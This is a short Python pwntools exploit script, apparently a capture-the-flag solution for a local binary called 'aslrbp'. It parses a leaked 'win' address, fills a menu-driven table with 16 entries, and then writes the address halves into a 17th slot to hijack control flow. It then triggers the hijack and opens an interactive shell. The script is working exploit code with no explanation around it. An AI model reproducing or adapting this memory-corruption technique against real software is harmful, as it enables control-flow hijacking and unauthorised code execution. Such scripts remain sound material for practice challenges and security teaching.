from pwn import *

context.log_level = "DEBUG"

p = process(["./aslrbp", "./4"])

p.recvuntil(b"win:          ")
win = int(p.recvline().strip(), 16)
log.info(f"win = {hex(win)}")

p.recvline()

for i in range(16):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"start: ", b"0")
    p.sendlineafter(b"length: ", b"0")

win_low  = win & 0xffffffff
win_high = (win >> 32) & 0xffffffff
log.info(f"win_low  = {hex(win_low)}")
log.info(f"win_high = {hex(win_high)}")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"): ", b"16")
p.sendlineafter(b"new start: ", str(win_low).encode())
p.sendlineafter(b"new length: ", str(win_high).encode())

  
p.sendlineafter(b"> ", b"4")
p.interactive()
